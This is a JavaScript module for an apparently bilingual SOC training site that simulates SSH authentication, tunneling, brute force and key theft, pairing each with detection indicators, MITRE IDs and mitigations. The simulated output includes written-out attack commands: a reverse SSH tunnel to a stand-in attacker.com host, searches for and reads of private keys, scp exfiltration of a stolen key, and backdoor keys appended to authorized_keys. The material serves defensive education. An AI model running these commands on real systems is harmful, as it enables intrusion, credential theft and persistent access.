// ── SSH Module — app.js ────────────────────────────────────────────────────
'use strict';

const sshDemo = (() => {

  // ── utilidades (via SOC compartido) ──────────────────────────────────────
  const $           = SOC.$;
  const rand        = SOC.rand;

  const t = (es, en) => (typeof i18n !== 'undefined' && i18n.getLang() === 'en') ? en : es;
  const randHex     = SOC.randHex;
  const sleep       = SOC.sleep;
  const createLogger = SOC.createLogger;

  // ── Demo 1: SSH Authentication ────────────────────────────────────────────
  async function runAuth() {
    const server = $('ssh-server').value.trim() || 'prod-server-01';
    const user   = $('ssh-user').value.trim()   || 'admin';
    const method = $('ssh-auth').value;
    const L = createLogger('ssh-auth-output');
    L.clear();

    await L.log(t('=== SIMULACIÓN DE AUTENTICACIÓN SSH ===', '=== SSH AUTHENTICATION SIMULATION ==='), 'header', 0);
    await L.log(t(`Servidor: ${server}:22  Usuario: ${user}`, `Server: ${server}:22  User: ${user}`), 'info', 100);
    await L.log(t(`Método: ${method === 'password' ? 'Password' : method === 'key' ? 'Clave pública (Ed25519)' : 'Password + MFA'}`, `Method: ${method === 'password' ? 'Password' : method === 'key' ? 'Public key (Ed25519)' : 'Password + MFA'}`), 'info', 100);
    await L.log('', 'info', 50);

    // TCP
    await L.log(t('[ TCP + PROTOCOLO SSH ]', '[ TCP + SSH PROTOCOL ]'), 'header', 200);
    await L.log(t(`Cliente  →  ${server}:22  [SYN]`, `Client  →  ${server}:22  [SYN]`), 'send', 300);
    await L.log(t(`${server}:22  →  Cliente  [SYN-ACK]`, `${server}:22  →  Client  [SYN-ACK]`), 'recv', 300);

    // Banner exchange
    await L.log('', 'info', 100);
    await L.log('[ BANNER EXCHANGE ]', 'header', 200);
    const serverVer = 'OpenSSH_8.9p1 Ubuntu-3ubuntu0.6';
    await L.log(`SSH-2.0-${serverVer}`, 'recv', 400);
    await L.log(`SSH-2.0-OpenSSH_9.6`, 'send', 400);
    await L.log(t(`⚠ Banner revela versión: ${serverVer} (buscar CVEs)`, `⚠ Banner reveals version: ${serverVer} (search CVEs)`), 'warn', 200);

    // Key exchange
    await L.log('', 'info', 100);
    await L.log('[ KEY EXCHANGE — ECDH ]', 'header', 200);
    await L.log(t(`SSH_MSG_KEXINIT  →  Algoritmos propuestos por cliente:`, `SSH_MSG_KEXINIT  →  Algorithms proposed by client:`), 'send', 300);
    await L.log(`  kex:    curve25519-sha256, ecdh-sha2-nistp256`, 'code', 200);
    await L.log(`  cipher: aes256-gcm@openssh.com, chacha20-poly1305`, 'code', 200);
    await L.log(`  mac:    hmac-sha2-256, umac-128`, 'code', 200);
    await L.log(t(`SSH_MSG_KEXINIT  ←  Algoritmos elegidos por servidor:`, `SSH_MSG_KEXINIT  ←  Algorithms chosen by server:`), 'recv', 300);
    await L.log(`  kex: curve25519-sha256  cipher: chacha20-poly1305  mac: hmac-sha2-256`, 'code', 200);
    await L.log(t(`SSH_MSG_KEX_ECDH_INIT   →  (clave pública efímera del cliente)`, `SSH_MSG_KEX_ECDH_INIT   →  (client ephemeral public key)`), 'send', 300);
    await L.log(t(`SSH_MSG_KEX_ECDH_REPLY  ←  (host key + clave pública efímera del servidor)`, `SSH_MSG_KEX_ECDH_REPLY  ←  (host key + server ephemeral public key)`), 'recv', 300);

    // Host key verification
    await L.log('', 'info', 100);
    await L.log(t('[ VERIFICACIÓN DE HOST KEY ]', '[ HOST KEY VERIFICATION ]'), 'header', 200);
    const fp = `SHA256:${randHex(4)}/${randHex(8)}+${randHex(6)}/${randHex(4)}=`;
    await L.log(t(`Huella del servidor: ${fp}`, `Server fingerprint: ${fp}`), 'info', 300);
    const known = Math.random() > 0.3;
    if (known) {
      await L.log(t(`✔ Host key verificada contra ~/.ssh/known_hosts`, `✔ Host key verified against ~/.ssh/known_hosts`), 'success', 400);
    } else {
      await L.log(t(`⚠ Host key NO encontrada en known_hosts (primera conexión)`, `⚠ Host key NOT found in known_hosts (first connection)`), 'warn', 300);
      await L.log(`The authenticity of host '${server}' can't be established.`, 'warn', 200);
      await L.log(`Ed25519 key fingerprint is ${fp}`, 'code', 200);
      await L.log(t(`→ VERIFICAR la huella por canal seguro antes de aceptar`, `→ VERIFY the fingerprint over a secure channel before accepting`), 'warn', 200);
    }

    // Auth
    await L.log('', 'info', 100);
    await L.log(t(`[ AUTENTICACIÓN — ${method.toUpperCase()} ]`, `[ AUTHENTICATION — ${method.toUpperCase()} ]`), 'header', 200);

    if (method === 'password') {
      await L.log(`SSH_MSG_USERAUTH_REQUEST  →  user=${user} method=password`, 'send', 400);
      await L.log(t(`  (contraseña enviada CIFRADA con la session key — a diferencia de FTP)`, `  (password sent ENCRYPTED with the session key — unlike FTP)`), 'code', 200);
      await L.log(`SSH_MSG_USERAUTH_SUCCESS  ←`, 'recv', 400);
      await L.log(t(`✔ Autenticado como ${user}`, `✔ Authenticated as ${user}`), 'success', 200);
      await L.log('', 'info', 100);
      await L.log(t('⚠ RIESGO: contraseña puede ser atacada por brute force', '⚠ RISK: password can be attacked by brute force'), 'warn', 200);
      await L.log(t('💡 Recomendación: PasswordAuthentication no — usar clave pública', '💡 Recommendation: PasswordAuthentication no — use public key'), 'warn', 200);

    } else if (method === 'key') {
      const keyFP = `SHA256:${randHex(4)}+${randHex(8)}//${randHex(6)}`;
      await L.log(`SSH_MSG_USERAUTH_REQUEST  →  user=${user} method=publickey`, 'send', 400);
      await L.log(t(`  Clave Ed25519 propuesta: ${keyFP}`, `  Ed25519 key proposed: ${keyFP}`), 'code', 200);
      await L.log(t(`SSH_MSG_USERAUTH_PK_OK  ←  (la clave está en authorized_keys)`, `SSH_MSG_USERAUTH_PK_OK  ←  (the key is in authorized_keys)`), 'recv', 400);
      await L.log(t(`SSH_MSG_USERAUTH_REQUEST  →  (firma del challenge con clave privada)`, `SSH_MSG_USERAUTH_REQUEST  →  (challenge signature with private key)`), 'send', 400);
      await L.log(t(`  Challenge cifrado con clave pública → solo la clave privada puede firmar`, `  Challenge encrypted with public key → only the private key can sign`), 'code', 200);
      await L.log(t(`  La clave privada NUNCA viaja por la red`, `  The private key NEVER travels over the network`), 'code', 200);
      await L.log(`SSH_MSG_USERAUTH_SUCCESS  ←`, 'recv', 400);
      await L.log(t(`✔ Autenticado como ${user} con clave pública`, `✔ Authenticated as ${user} with public key`), 'success', 200);
      await L.log('', 'info', 100);
      await L.log(t('✔ Sin contraseña → inmune a brute force de contraseña', '✔ No password → immune to password brute force'), 'success', 200);
      await L.log(t('✔ Clave privada nunca expuesta en la red', '✔ Private key never exposed on the network'), 'success', 200);

    } else {
      // MFA
      await L.log(`SSH_MSG_USERAUTH_REQUEST  →  user=${user} method=password`, 'send', 400);
      await L.log(`SSH_MSG_USERAUTH_INFO_REQUEST  ←  "Verification code:"`, 'recv', 400);
      const otp = String(rand(100000, 999999));
      await L.log(t(`SSH_MSG_USERAUTH_INFO_RESPONSE  →  (código TOTP: ${otp})`, `SSH_MSG_USERAUTH_INFO_RESPONSE  →  (TOTP code: ${otp})`), 'send', 400);
      await L.log(`SSH_MSG_USERAUTH_SUCCESS  ←`, 'recv', 400);
      await L.log(t(`✔ Autenticado con contraseña + MFA (TOTP)`, `✔ Authenticated with password + MFA (TOTP)`), 'success', 200);
      await L.log('', 'info', 100);
      await L.log(t('✔ MFA: incluso con contraseña comprometida, se necesita el código TOTP', '✔ MFA: even with a compromised password, the TOTP code is required'), 'success', 200);
    }

    // Session
    await L.log('', 'info', 100);
    await L.log(t('[ SESIÓN SSH ESTABLECIDA — TODO CIFRADO ]', '[ SSH SESSION ESTABLISHED — ALL ENCRYPTED ]'), 'header', 200);
    await L.log(`Canal cifrado: chacha20-poly1305@openssh.com`, 'success', 200);
    await L.log(`MAC: hmac-sha2-256`, 'success', 200);
    await L.log(t(`Forward secrecy: sí (ECDH efímero — si el host key es robado, sesiones pasadas seguras)`, `Forward secrecy: yes (ephemeral ECDH — if the host key is stolen, past sessions stay safe)`), 'success', 200);
  }

  // ── Demo 2: SSH Tunneling ──────────────────────────────────────────────────
  async function runTunnel() {
    const ttype = $('tunnel-type').value;
    const jump  = $('tunnel-jump').value.trim() || 'bastion.empresa.com';
    const L = createLogger('ssh-tunnel-output');
    L.clear();

    await L.log('=== SSH TUNNELING ===', 'header', 0);

    if (ttype === 'local') {
      await L.log(t('Tipo: LOCAL FORWARDING (-L)', 'Type: LOCAL FORWARDING (-L)'), 'info', 100);
      await L.log(t('Objetivo: acceder a un recurso interno desde afuera', 'Goal: reach an internal resource from outside'), 'info', 100);
      await L.log('', 'info', 50);
      await L.log(t('Comando:', 'Command:'), 'header', 200);
      await L.log(`ssh -L 5432:db-interna.empresa.com:5432 user@${jump}`, 'code', 300);
      await L.log('', 'info', 100);
      await L.log(t('Flujo de datos:', 'Data flow:'), 'header', 200);
      await L.log(t(`  Tu laptop:5432  ──SSH cifrado──►  ${jump}  ──LAN──►  db-interna:5432`, `  Your laptop:5432  ──encrypted SSH──►  ${jump}  ──LAN──►  internal-db:5432`), 'code', 400);
      await L.log('', 'info', 100);
      await L.log(t('Uso legítimo:', 'Legitimate use:'), 'success', 200);
      await L.log(t('  psql -h localhost -p 5432 -U dbadmin  → conecta a la DB interna', '  psql -h localhost -p 5432 -U dbadmin  → connects to the internal DB'), 'code', 200);
      await L.log(t('Uso malicioso:', 'Malicious use:'), 'attack', 200);
      await L.log(t('  → Atacante con acceso al bastion puede alcanzar recursos internos', '  → Attacker with bastion access can reach internal resources'), 'attack', 200);
      await L.log(t('  → Bypass de segmentación de red / VLAN', '  → Bypass of network segmentation / VLAN'), 'attack', 200);
      await L.log('', 'info', 100);
      await L.log(t('IOC Zeek: sesión SSH con duración larga + bytes proporcionales al uso de DB', 'IOC Zeek: long-duration SSH session + bytes proportional to DB usage'), 'warn', 300);

    } else if (ttype === 'remote') {
      await L.log(t('Tipo: REMOTE FORWARDING (-R) — BACKDOOR', 'Type: REMOTE FORWARDING (-R) — BACKDOOR'), 'info', 100);
      await L.log(t('Objetivo: exponer un servicio interno al exterior', 'Goal: expose an internal service to the outside'), 'info', 100);
      await L.log('', 'info', 50);
      await L.log(t('Comando (ejecutado DESDE la víctima):', 'Command (executed FROM the victim):'), 'header', 200);
      await L.log(t(`ssh -R 9001:localhost:22 attacker@atacante.com`, `ssh -R 9001:localhost:22 attacker@attacker.com`), 'code', 300);
      await L.log('', 'info', 100);
      await L.log(t('Flujo:', 'Flow:'), 'header', 200);
      await L.log(t(`  Víctima  ──SSH cifrado──►  atacante.com  (la víctima inicia)`, `  Victim  ──encrypted SSH──►  attacker.com  (the victim initiates)`), 'send', 400);
      await L.log(t(`  Atacante  →  atacante.com:9001  ──tunnel──►  Víctima:22`, `  Attacker  →  attacker.com:9001  ──tunnel──►  Victim:22`), 'attack', 400);
      await L.log('', 'info', 100);
      await L.log(t('⚡ PELIGRO CRÍTICO:', '⚡ CRITICAL DANGER:'), 'attack', 200);
      await L.log(t('  → La víctima sale del firewall (conexión saliente, normalmente permitida)', '  → The victim exits through the firewall (outbound connection, usually allowed)'), 'attack', 200);
      await L.log(t('  → El atacante puede conectarse al SSH de la víctima sin pasar el firewall', '  → The attacker can connect to the victim SSH without crossing the firewall'), 'attack', 200);
      await L.log(t('  → Backdoor persistente: malware/cron que mantiene este túnel activo', '  → Persistent backdoor: malware/cron keeping this tunnel alive'), 'attack', 200);
      await L.log('', 'info', 100);
      await L.log(t('IOC: conexiones SSH salientes DESDE servers internos hacia IPs externas', 'IOC: outbound SSH connections FROM internal servers to external IPs'), 'warn', 300);
      await L.log(t('     Servers no deberían hacer SSH saliente — solo recibir SSH entrante', '     Servers should not make outbound SSH — only receive inbound SSH'), 'warn', 200);

    } else {
      // dynamic
      await L.log(t('Tipo: DYNAMIC FORWARDING (-D) — SOCKS PROXY', 'Type: DYNAMIC FORWARDING (-D) — SOCKS PROXY'), 'info', 100);
      await L.log(t('Objetivo: crear un proxy que tuneliza cualquier tráfico TCP', 'Goal: create a proxy that tunnels any TCP traffic'), 'info', 100);
      await L.log('', 'info', 50);
      await L.log(t('Comando:', 'Command:'), 'header', 200);
      await L.log(`ssh -D 1080 -N user@${jump}`, 'code', 300);
      await L.log('', 'info', 100);
      await L.log(t('Flujo:', 'Flow:'), 'header', 200);
      await L.log(t(`  Aplicación  →  localhost:1080(SOCKS5)  ──SSH──►  ${jump}  →  Internet`, `  Application  →  localhost:1080(SOCKS5)  ──SSH──►  ${jump}  →  Internet`), 'code', 400);
      await L.log('', 'info', 100);
      await L.log(t('Uso legítimo:', 'Legitimate use:'), 'success', 200);
      await L.log(t('  Acceso seguro a la red corporativa como si estuvieras adentro', '  Secure access to the corporate network as if you were inside'), 'code', 200);
      await L.log(t('Uso malicioso:', 'Malicious use:'), 'attack', 200);
      await L.log(t('  → Atacante rutea TODO su tráfico por el bastión', '  → Attacker routes ALL their traffic through the bastion'), 'attack', 200);
      await L.log(t('  → Acceso a TODA la red interna desde Internet', '  → Access to the ENTIRE internal network from the Internet'), 'attack', 200);
      await L.log(t('  → Evasión de logging: el bastión hace las conexiones, no el atacante', '  → Logging evasion: the bastion makes the connections, not the attacker'), 'attack', 200);
      await L.log('', 'info', 100);
      await L.log('IOC Zeek:', 'header', 200);
      await L.log(t('  ssh.log: sesión muy larga con alto orig_bytes + resp_bytes balanceados', '  ssh.log: very long session with high orig_bytes + balanced resp_bytes'), 'warn', 300);
      await L.log(t('  conn.log: muchas conexiones TCP DESDE el bastión a muchas IPs internas', '  conn.log: many TCP connections FROM the bastion to many internal IPs'), 'warn', 300);
      await L.log(t('  → Patrón de "fan out": 1 entrada SSH → N conexiones salientes desde bastion', '  → "Fan out" pattern: 1 inbound SSH → N outbound connections from bastion'), 'warn', 300);
    }
  }

  // ── Demo 3: Brute Force / Scan / Key theft ────────────────────────────────
  async function runBrute() {
    const target = $('brute-target').value.trim() || '192.168.1.10';
    const btype  = $('brute-type').value;
    const L = createLogger('ssh-brute-output');
    L.clear();

    if (btype === 'scan') {
      await L.log('=== SSH VERSION SCAN ===', 'header', 0);
      await L.log(t(`Objetivo: ${target}`, `Target: ${target}`), 'info', 100);
      await L.log(t('Herramienta: nmap -p 22 -sV', 'Tool: nmap -p 22 -sV'), 'code', 200);
      await L.log('', 'info', 100);
      await L.log('PORT   STATE  SERVICE  VERSION', 'recv', 400);
      await L.log(`22/tcp open   ssh      OpenSSH 7.4 (protocol 2.0)`, 'recv', 400);
      await L.log('| ssh-hostkey:', 'recv', 300);
      await L.log(`|   2048 ${randHex(32)} (RSA)`, 'recv', 200);
      await L.log(`|   256  ${randHex(32)} (ECDSA)`, 'recv', 200);
      await L.log(`|_  256  ${randHex(32)} (ED25519)`, 'recv', 200);
      await L.log('', 'info', 100);
      await L.log(t('⚠ OpenSSH 7.4 — versión vieja (2017)', '⚠ OpenSSH 7.4 — old version (2017)'), 'warn', 300);
      await L.log(t('  CVE-2018-15473: user enumeration (permite identificar usuarios válidos)', '  CVE-2018-15473: user enumeration (allows identifying valid users)'), 'danger', 200);
      await L.log(t('  → ssh user@target + respuesta de tiempo diferente si el user existe', '  → ssh user@target + different response time if the user exists'), 'code', 200);
      await L.log(t('  Verificar si hay parche o actualizar a OpenSSH ≥ 9.x', '  Check for a patch or update to OpenSSH ≥ 9.x'), 'warn', 300);
      return;
    }

    if (btype === 'key') {
      await L.log('=== SSH KEY THEFT — POST-COMPROMISE ===', 'header', 0);
      await L.log(t('Escenario: acceso inicial obtenido (webshell, RCE, phishing)', 'Scenario: initial access obtained (webshell, RCE, phishing)'), 'info', 100);
      await L.log(t('Objetivo: encontrar claves SSH para movimiento lateral', 'Goal: find SSH keys for lateral movement'), 'info', 100);
      await L.log('', 'info', 100);
      await L.log(t('[ BÚSQUEDA DE CLAVES PRIVADAS ]', '[ PRIVATE KEY SEARCH ]'), 'header', 200);
      await L.log('find / -name "id_*" -not -name "*.pub" 2>/dev/null', 'code', 300);
      await sleep(500);
      await L.log('/home/admin/.ssh/id_rsa', 'recv', 300);
      await L.log('/home/deploy/.ssh/id_ed25519', 'recv', 300);
      await L.log('/root/.ssh/id_rsa', 'recv', 300);
      await L.log('/var/jenkins/.ssh/id_rsa', 'recv', 300);
      await L.log('', 'info', 100);
      await L.log(t('[ LECTURA DE CLAVE PRIVADA ]', '[ PRIVATE KEY READ ]'), 'header', 200);
      await L.log('cat /root/.ssh/id_rsa', 'code', 300);
      await L.log('-----BEGIN OPENSSH PRIVATE KEY-----', 'recv', 300);
      await L.log(`b3BlbnNzaC1rZXktdjEAAAAA${randHex(48)}`, 'recv', 200);
      await L.log(`${randHex(64)}`, 'recv', 200);
      await L.log('-----END OPENSSH PRIVATE KEY-----', 'recv', 300);
      await L.log(t('⚡ Clave privada RSA de root obtenida', '⚡ root RSA private key obtained'), 'attack', 200);
      await L.log('', 'info', 100);
      await L.log(t('[ VER QUÉ SERVIDORES ACEPTA ESTA CLAVE ]', '[ SEE WHICH SERVERS ACCEPT THIS KEY ]'), 'header', 200);
      await L.log('cat /root/.ssh/config', 'code', 300);
      const servers = ['prod-db-01', 'prod-api-02', 'staging-server', 'backup-server'];
      for (const s of servers) {
        await L.log(`  Host ${s}`, 'recv', 200);
        await L.log(`    IdentityFile ~/.ssh/id_rsa`, 'recv', 150);
      }
      await L.log('', 'info', 100);
      await L.log(t('[ MOVIMIENTO LATERAL ]', '[ LATERAL MOVEMENT ]'), 'header', 200);
      for (const s of servers.slice(0, 2)) {
        await L.log(`ssh -i stolen_root.pem root@${s}`, 'code', 300);
        await L.log(t(`root@${s}:~#  ← acceso obtenido`, `root@${s}:~#  ← access obtained`), 'attack', 400);
      }
      await L.log('', 'info', 100);
      await L.log(t('[ INSTALACIÓN DE BACKDOOR ]', '[ BACKDOOR INSTALLATION ]'), 'header', 200);
      await L.log(`echo "ssh-ed25519 AAAA...attackerkey..." >> /root/.ssh/authorized_keys`, 'code', 300);
      await L.log(t('⚡ Backdoor persistente instalado — acceso aunque cambien la contraseña', '⚡ Persistent backdoor installed — access even if they change the password'), 'attack', 200);
      return;
    }

    // brute force
    await L.log('=== SSH BRUTE FORCE ===', 'header', 0);
    await L.log(t(`Objetivo: ${target}:22`, `Target: ${target}:22`), 'info', 100);
    await L.log(t('Herramienta: hydra -l root -P rockyou.txt ssh://target', 'Tool: hydra -l root -P rockyou.txt ssh://target'), 'code', 200);
    await L.log('', 'info', 100);
    await L.log(t('[ auth.log EN EL SERVIDOR (en tiempo real) ]', '[ auth.log ON THE SERVER (real time) ]'), 'header', 200);

    const passwords = ['123456','password','admin','letmein','toor','qwerty','root123',
                       'pass1234','abc123','shadow','P@ssw0rd','Admin2024!'];
    const successIdx = rand(7, 11);
    const srcIP = `${rand(1,254)}.${rand(1,254)}.${rand(1,254)}.${rand(1,254)}`;
    const baseTs = new Date();
    let elapsed = 0;   // acumulador: garantiza timestamps monótonos crecientes

    for (let i = 0; i <= successIdx; i++) {
      elapsed += rand(600, 1500);
      const ts = new Date(baseTs.getTime() + elapsed);
      const timeStr = ts.toLocaleTimeString('es-AR', { hour12: false });
      const pass = passwords[i];
      if (i === successIdx) {
        await L.log(`Jun 25 ${timeStr} ${target} sshd: Accepted password for root from ${srcIP}`, 'attack', 200);
        break;
      } else {
        await L.log(`Jun 25 ${timeStr} ${target} sshd: Failed password for root from ${srcIP}`, 'code', 180);
      }
    }

    await L.log('', 'info', 100);
    await L.log(t('=== RESULTADO ===', '=== RESULT ==='), 'header', 200);
    await L.log(t(`⚡ Contraseña encontrada para root: ${passwords[successIdx]}`, `⚡ Password found for root: ${passwords[successIdx]}`), 'attack', 200);
    await L.log(t(`📊 Sin bloqueo de cuenta tras ${successIdx} intentos fallidos`, `📊 No account lockout after ${successIdx} failed attempts`), 'danger', 200);
    await L.log('', 'info', 100);
    await L.log('[ ZEEK IOC — ssh.log ]', 'header', 200);
    await L.log(t(`${successIdx + 1} entradas con auth_success=false + 1 con true  →  brute force exitoso`, `${successIdx + 1} entries with auth_success=false + 1 with true  →  successful brute force`), 'warn', 300);
    await L.log('', 'info', 100);
    await L.log(t('MITIGACIONES:', 'MITIGATIONS:'), 'header', 200);
    await L.log(t('  1. PasswordAuthentication no  →  elimina brute force de contraseñas', '  1. PasswordAuthentication no  →  eliminates password brute force'), 'code', 200);
    await L.log(t('  2. fail2ban: ban tras 5 fallos en 10 minutos', '  2. fail2ban: ban after 5 failures in 10 minutes'), 'code', 200);
    await L.log(t('  3. AllowUsers: lista blanca → root no debería poder loguearse', '  3. AllowUsers: whitelist → root should not be able to log in'), 'code', 200);
    await L.log(t('  4. Port knocking o VPN: ocultar TCP/22 del Internet público', '  4. Port knocking or VPN: hide TCP/22 from the public Internet'), 'code', 200);
  }

  function reset() {
    ['ssh-auth-output', 'ssh-tunnel-output', 'ssh-brute-output'].forEach(id => {
      const el = document.getElementById(id);
      if (el) el.innerHTML = '<div class="log-line"><span class="log-time">[→]</span><span class="log-info">Esperando simulación SSH...</span></div>';
    });
  }


  async function runKeyTheft() {
    const victim  = document.getElementById('keytheft-victim').value.trim() || 'dev-workstation-01';
    const stage   = document.getElementById('keytheft-stage').value;
    const L = createLogger('keytheft-output');
    L.clear();

    await L.log('=== SSH KEY THEFT SIMULATION ===', 'header', 0);
    await L.log(t(`Sistema comprometido: ${victim}`, `Compromised system: ${victim}`), 'warn', 100);
    await L.log('', 'info', 100);

    if (stage === 'search') {
      await L.log(t('[ BUSQUEDA DE CLAVES PRIVADAS SSH ]', '[ SSH PRIVATE KEY SEARCH ]'), 'header', 200);
      await L.log(t('Contexto: acceso inicial obtenido (RCE, shell web, etc.)', 'Context: initial access obtained (RCE, web shell, etc.)'), 'warn', 200);
      await L.log('', 'info', 100);
      await L.log('find / -name "id_rsa" -o -name "id_ed25519" -o -name "id_ecdsa" 2>/dev/null', 'code', 300);
      await L.log('', 'info', 200);
      const users = ['jdoe', 'admin', 'deploy'];
      for (const u of users) {
        await L.log(`/home/${u}/.ssh/id_ed25519`, 'attack', 200);
        await L.log(`/home/${u}/.ssh/id_rsa`, 'attack', 150);
      }
      await L.log('/root/.ssh/id_ed25519', 'attack', 200);
      await L.log('/root/.ssh/id_rsa', 'attack', 150);
      await L.log(t('/etc/ssh/ssh_host_ed25519_key  (clave del servidor)', '/etc/ssh/ssh_host_ed25519_key  (server key)'), 'danger', 200);
      await L.log('', 'info', 100);
      await L.log(t('Verificar si tienen passphrase:', 'Check whether they have a passphrase:'), 'header', 200);
      await L.log('grep -l "ENCRYPTED" /home/*/.ssh/id_* /root/.ssh/id_*', 'code', 300);
      await L.log(t('  /home/deploy/.ssh/id_ed25519  → SIN passphrase (usable directo)', '  /home/deploy/.ssh/id_ed25519  → NO passphrase (directly usable)'), 'attack', 300);
      await L.log(t('  /home/jdoe/.ssh/id_rsa        → CON passphrase (necesita crack)', '  /home/jdoe/.ssh/id_rsa        → WITH passphrase (needs cracking)'), 'warn', 200);
      await L.log('', 'info', 100);
      await L.log(t('Buscar authorized_keys para mapear accesos:', 'Search authorized_keys to map access:'), 'header', 200);
      await L.log('cat /home/deploy/.ssh/authorized_keys', 'code', 200);
      await L.log(t('  → acceso a: bastion.empresa.com, srv-prod-01..05, db-master', '  → access to: bastion.empresa.com, srv-prod-01..05, db-master'), 'attack', 300);
      await L.log('MITRE: T1552.004 — Unsecured Credentials: Private Keys', 'info', 200);

    } else if (stage === 'exfil') {
      await L.log(t('[ EXFILTRACION Y USO DE CLAVE ROBADA ]', '[ EXFILTRATION AND USE OF STOLEN KEY ]'), 'header', 200);
      await L.log('', 'info', 100);
      await L.log(t('Exfiltrar clave del sistema comprometido:', 'Exfiltrate the key from the compromised system:'), 'header', 200);
      await L.log(`scp ${victim}:/home/deploy/.ssh/id_ed25519 /tmp/stolen_key`, 'code', 300);
      await L.log('chmod 600 /tmp/stolen_key', 'code', 200);
      await L.log('', 'info', 100);
      await L.log(t('Uso inmediato de la clave robada:', 'Immediate use of the stolen key:'), 'header', 200);
      await L.log('ssh -i /tmp/stolen_key deploy@bastion.empresa.com', 'code', 300);
      await L.log('deploy@bastion:~$ id', 'code', 200);
      await L.log('uid=1001(deploy) gid=1001(deploy) groups=1001(deploy),27(sudo)', 'attack', 300);
      await L.log('', 'info', 100);
      await L.log(t('Pivoting a servidores internos:', 'Pivoting to internal servers:'), 'header', 200);
      await L.log(t('ssh -i /tmp/stolen_key deploy@srv-prod-01  → acceso', 'ssh -i /tmp/stolen_key deploy@srv-prod-01  → access'), 'attack', 200);
      await L.log(t('ssh -i /tmp/stolen_key deploy@srv-prod-02  → acceso', 'ssh -i /tmp/stolen_key deploy@srv-prod-02  → access'), 'attack', 200);
      await L.log(t('ssh -i /tmp/stolen_key deploy@db-master    → acceso', 'ssh -i /tmp/stolen_key deploy@db-master    → access'), 'attack', 200);
      await L.log('', 'info', 100);
      await L.log('Zeek ssh.log IOC:', 'header', 200);
      await L.log(t('  mismo usuario, auth_success=true, 5 IPs distintas en 3 minutos', '  same user, auth_success=true, 5 different IPs in 3 minutes'), 'danger', 300);
      await L.log(t('  client: OpenSSH en OS distinto al habitual del usuario', '  client: OpenSSH on an OS different from the user usual one'), 'danger', 200);
      await L.log('MITRE: T1021.004 — Remote Services: SSH', 'info', 200);

    } else {
      await L.log(t('[ PERSISTENCIA — agregar clave del atacante ]', '[ PERSISTENCE — add the attacker key ]'), 'header', 200);
      await L.log('', 'info', 100);
      await L.log(t('Generar par de claves del atacante:', 'Generate the attacker key pair:'), 'header', 200);
      await L.log('ssh-keygen -t ed25519 -f /tmp/backdoor_key -N ""', 'code', 300);
      await L.log('', 'info', 100);
      await L.log(t('Instalar backdoor en todos los usuarios del sistema:', 'Install backdoor on all system users:'), 'header', 200);
      for (const u of ['root', 'jdoe', 'admin', 'deploy']) {
        await L.log(`echo "ssh-ed25519 AAAA...backdoor..." >> /home/${u}/.ssh/authorized_keys`, 'attack', 200);
      }
      await L.log('', 'info', 100);
      await L.log(t('Resultado: acceso permanente aunque cambien contraseñas', 'Result: permanent access even if passwords change'), 'danger', 300);
      await L.log(t('El usuario legítimo no nota nada (múltiples claves son normales)', 'The legitimate user notices nothing (multiple keys are normal)'), 'danger', 200);
      await L.log('', 'info', 100);
      await L.log(t('DETECCION:', 'DETECTION:'), 'header', 200);
      await L.log('auditd: -w /root/.ssh/authorized_keys -p wa -k ssh_backdoor', 'warn', 200);
      await L.log(t('SIEM: alerta si authorized_keys modificado fuera de ventana de cambios', 'SIEM: alert if authorized_keys modified outside the change window'), 'warn', 200);
      await L.log('MITRE: T1098.004 — Account Manipulation: SSH Authorized Keys', 'info', 200);
    }
  }

  return { runAuth, runTunnel, runBrute, runKeyTheft, reset };
})();

window.sshDemo = sshDemo;
